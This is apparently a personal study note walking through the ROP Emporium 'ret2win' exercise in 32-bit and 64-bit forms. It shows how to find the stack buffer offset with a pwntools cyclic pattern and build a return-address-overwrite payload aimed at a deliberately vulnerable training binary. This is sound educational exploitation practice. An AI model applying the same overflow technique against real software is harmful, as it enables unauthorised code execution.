Links [[00 - Global Index (Start Here!)]] [[ROP Emporium]]

# [[ret2win]]
# Contents
***
- Task Description
- 32 bit
- 64 bit

## Task Description
---
Locate a method that you want to call within the binary.  
Call it by overwriting a saved return address on the stack.

## 32 bit
---
File checks:
32 bit ELF with no canaries
Checking function from within pwndbg.
Three of intrest; main, pwnme, ret2win

For the exploit all that is needed is the buffer size and the location of the ret2win function.

make a cyclic pattern.
```python
from pwn import *
g = cyclic_gen()
g.get(100)
```
Then use ```g.find()``` to get the buffer size of 44.
The ret2win function has a memory location of 0x804862c
little endian byte
```
\x2c\x86\x04\x08
```
Generate the payload
```bash
python2 -c 'print "A"*44+"\x2c\x86\x04\x08"' > payload.32bit
```
Run it against the binary. This works and gives out the flag.
```flag
ROPE{a_placeholder_32byte_flag!}
```

## 64 bit
***
File Checks
64bit ELF with no canaries
Same three function as the 32bit
Find the buffer size by adding 4 bytes to the RBP
which is 40 bytes
find the memory location of the ret2win functions.
0x400756
memory location needs to be 8 bytes
0x0000000000400756
convert to little endian
```bash

\x56\x07\x40\x00\x00\x00\x00\x00
```
Add the buffer and run the payload

---
Creation date: 08-10-2022

Last modified date: Sunday 8th October 2022
***
